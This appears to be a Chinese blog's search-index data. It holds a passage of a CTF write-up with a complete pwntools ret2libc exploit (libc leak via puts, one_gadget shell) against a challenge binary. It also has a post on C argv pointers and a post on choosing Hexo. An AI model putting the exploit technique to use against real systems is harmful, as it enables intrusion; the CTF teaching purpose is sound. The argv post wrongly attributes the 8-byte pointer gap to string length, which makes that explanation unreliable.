binary 裡面的 main 位置相減，就知道整個函式庫載入到 memory 的哪個位置了\n\n## payload\n\n先備知識：\n\n> Linux x86-64 下的 calling convention\n\n參數少於 7，參數從左到右放入暫存器順序為: rdi, rsi, rdx, rcx, r8, r9\n\n```python\npayload = flat([\n                offset, # 透過 read 蓋一堆 'a' 直到 ret addr\n                pop_rdi_ret, # 設定 puts 的參數，只有一個，所以利用 pop_rdi 即可\n                elf.got['__libc_start_main'], # puts 的參數 1\n                elf.plt['puts'], # 執行 puts\n                elf.symbols['main'] # 執行完 puts 重新執行 main\n                ])\n```\n\n如此一來程式的流程就會變成，印出 `elf.got['__libc_start_main']` 並且重新執行 main\n\n接著只需要把印出的記憶體位置用 u64 打包並且減去 main 在程式中未載入時的位置就可以得知 load 到 memory 中的位移\n\n把位移再加上用 one_gadget 找到的 execve 就大工告成了!\n\n```python\npayload2 = flat([\n                offset,\n                u64(r.recv(6)+'\\x00\\x00') - libc.symbols['__libc_start_main'] + one_gadget\n])\n```\n\n以下是完整 payload\n\n```python\nfrom pwn import *\n\nelf = ELF('./pwn3')\n#libc = ELF('libc.so.6') #題目給的\nlibc = ELF('/lib/x86_64-linux-gnu/libc.so.6') #本地測試\n\ncontext(arch = 'amd64',log_level='debug')\nr = process('./pwn3')\n\noffset = 'a'*0x10\npop_rdi_ret = 0x4006d3\none_gadget = 0xf1147\n\npayload = flat([\n                offset,\n                pop_rdi_ret,\n                elf.got['__libc_start_main'],\n                elf.plt['puts'],\n                elf.symbols['main']\n                ])\nr.sendline(payload)\nr.recvline()\n\npayload2 = flat([\n                offset,\n                u64(r.recv(6)+'\\x00\\x00') - libc.symbols['__libc_start_main'] + one_gadget\n                ])\n\nr.sendline(payload2)\nr.interactive()\n```\n","tags":["資訊安全","ctf"]},{"title":"如何看待C語言的argv與指標關係","url":"/2019/03/01/","content":"\n## 前言\n\n在一次作業下碰到了 argv 與的操作，看到課本\n\n> UNIX Systems Programming: Communication, Concurrency and Threads: Communication, Concurrency and Threads (2nd Edition) 2nd Edition\n\n對於 argv 的操作為下\n\n```c\nint main(int argc, char* argv[]) { }\n```\n\n回想起以前常常都是使用以下這種用法\n\n```c\nint main(int argc, char** argv) { }\n```\n\n於是開始研究了 C 語言的 argv 到底傳了什麼東西給 main function\n\n## 正文\n\n在記憶體中 argv 是一個指標，指向 char 陣列，每一陣列的內容就是不同的 argv 字串，如下圖所示。\n\n<!-- {% asset_img argv_in_mem.png %} -->\n![1](argv_in_mem.png)\n\n> 圖片來源 (https://softwareengineering.stackexchange.com/questions/385819/why-is-c-c-main-argv-declared-as-char-argv-rather-than-just-char-argv)\n\n所以當 main 在接收 argv 這個指標時，它只是一個指向字元陣列的指標，需要對它進一步操作，例如：\n\n```c\n#include <stdio.h>\nint main(int argc, char* argv[]) {\n    printf(\"%s\\n\", argv[0]);  // argv指向陣列中的第0格的值\n    printf(\"%p\\n\", &argv[0]); // argv指向陣列中的第0格的位置\n    printf(\"%p\\n\", &argv[1]); // argv指向陣列中的第1格的位置\n    printf(\"%p\\n\", argv);     // argv指標本身存的值\n    printf(\"%p\\n\", &argv);    // argv指標本身的位置\n}\n```\n\n編譯:\n`gcc app.c`\n\noutput:\n\n```\n./a.out\n0x7fffffffe5b8\n0x7fffffffe5c0\n0x7fffffffe5b8\n0x7fffffffe4c0\n```\n\n把結果對印至上圖，如同以下：\n<!-- {% asset_img proof.png %} -->\n![2](./proof.png)\n\n如果將陣列的第二格位置與第一格相減，可以發現長度為 8\n\n`0x7fffffffe5c0 - 0x7fffffffe5b8 = 8`\n\n而這個 8 就是 `./a.out` 這個字串的長度 (`.`, `/`, `a`, `.`, `o`, `u`, `t`, `\\0`)\n\n## 結論\n\n如此一來，兩種寫法的關係就清晰多了。\n\n```c\nint main(int argc, char** argv) { }\n```\n\n這個寫法只不過是 pointer to pointer 的概念，與另外一種可以說是沒有分別。\n\n不相信的話可以做個小實驗：\n\n```c\n#include <stdio.h>\nint main(int argc, char** argv) {\n    printf(\"%s\\n\", argv[0]);\n    printf(\"%p\\n\", &argv[0]);\n    printf(\"%p\\n\", &argv[1]);\n    printf(\"%p\\n\", argv);\n    printf(\"%p\\n\", &argv);\n}\n```\n\n編譯:\n`gcc app2.c`\n\noutput:\n\n```\n./a.out\n0x7fffffffe5b8\n0x7fffffffe5c0\n0x7fffffffe5b8\n0x7fffffffe4c0\n```\n\n與上述第一種寫法完全相同！\n\n(實際上 OS 有一種 [ASLR](https://zh.wikipedia.org/wiki/%E4%BD%8D%E5%9D%80%E7%A9%BA%E9%96%93%E9%85%8D%E7%BD%AE%E9%9A%A8%E6%A9%9F%E8%BC%89%E5%85%A5) 的機制讓每一次執行程式的 virtual memory 都不同，所以做這個實驗時，記得先暫時關閉 ASLR。)\n\n所以依照個人習慣，想要用哪一種寫法都可以 👏\n","tags":["linux","c"]},{"title":"為何我選擇hexo當作個人blog?","url":"/2019/02/26/","content":"\n## 前言\n\n在網路上爬文學習的過程中，發現有很多人將技術文章或是教學文章都放在自己架設的部落格中。若不是放在自己的部落格中，多半是選擇 Medium 。\n\n我也有考慮過 `wordpress`, `Medium`\n\n最後決定使用 `hexo` 來架設靜態網站。\n\n## 正文\n\n這篇文章當作部落格的第一篇文章在適合不過了。\n\n選擇 hexo 有幾個原因。\n\n1. 滿足自己管理網站的慾望。 (有自己的 domain name 就是開心，有種一切都是自己掌管的感覺)\n2. 相較於 wordpress 可以更加容易部署與轉移環境\n3. 以防自己的 VPS 主機有什麼三長兩短，還可以部署在 github 上\n4. markdown 語法的支援。已經習慣 markdown 了，實在不太想花心思去學其他種語法(雖然也有看到人家說 Medium 的語法很好上手，但我就是懶)\n\n從我決定要使用 hexo 到真正部署上線花的時間約莫不到一小時，其中有比較多的時間是在看主題的設定檔，修改一些設定。\n\n## 心得\n\n基本上 hexo-cli 就能完成大部分的事情，從建立完文章模板，打開編輯器編輯文章，產生靜態檔案，部署。\n\n對於常常接觸 cli 的人來說完全不成問題，使用第一天的心得還算滿意。\n\n之後沒意外的話除了部署在 github.io 以外，也部署在自己的主機上。\n\n<!-- {% asset_img hexo.png %} -->\n![1](hexo.png)\n\n補上一張螢幕截圖，結束第一篇文章 😄\n","tags":["個人"]}]